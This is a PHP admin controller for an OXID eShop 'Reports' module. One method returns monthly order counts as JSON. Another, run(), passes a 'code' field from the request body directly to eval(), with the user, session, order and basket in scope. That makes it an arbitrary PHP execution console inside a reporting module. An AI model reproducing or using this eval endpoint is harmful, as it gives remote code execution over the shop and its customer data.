<?php

/**
 * [bla] Reports
 * The MIT License (MIT)
 *
 * Copyright (C) 2015  bestlife AG <oxid@bestlife.ag>
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 *
 * Version:    2.0.0
 * Author:     Rafael Dabrowski
 * Author:     Marat Bedoev
 */
 
class bla_reports extends oxAdminView
{
    protected $_sThisTemplate  = 'bla_reports.tpl';
    
    public function orders()
    {
        $oDb = oxDb::getDb();
        
        $aLabels = array();
        $aSeries = ['orders'];
        $aData = array();
        
        $aValues = $oDb->getArray('SELECT YEAR(oxorderdate), MONTH(oxorderdate), COUNT(*) FROM oxorder GROUP BY YEAR(oxorderdate), MONTH(oxorderdate) ORDER BY YEAR(oxorderdate) ASC, MONTH(oxorderdate)');
        foreach($aValues as $val)
        {
            $aLabels[] = $val[0]."-".$val[1];
            $aData[] = $val[2];
        }
        
        //$aOrders = ['series' => $aSeries, 'labels' => $aLabels, 'values' => $aData];
        echo json_encode($aValues);
        exit;
    }
    
    public function paymethods()
    {
        
    }
    
    public function run()
    {
        $data = json_decode(file_get_contents('php://input'), true);
        $code = $data['code'];
        
        $cfg = oxRegistry::getConfig();
        $me = $user = $cfg->getUser();
        $session = $user->getSession();
        $order = array_shift( $user->getOrders( 1 )->getArray() );
        $basket = $user->getSession()->getBasket();
        $basket->load();
        $basket->setPayment("oxidpayadvance");
        $basket->calculateBasket();

        $fnc = function ( $code ) use ( $cfg, $me, $session, $order, $basket )
        {
            return eval( $code );
        };

        ob_start();
        echo json_encode(['error' => $fnc( $code ), 'output' => ob_get_clean()]);
        exit;
    }

}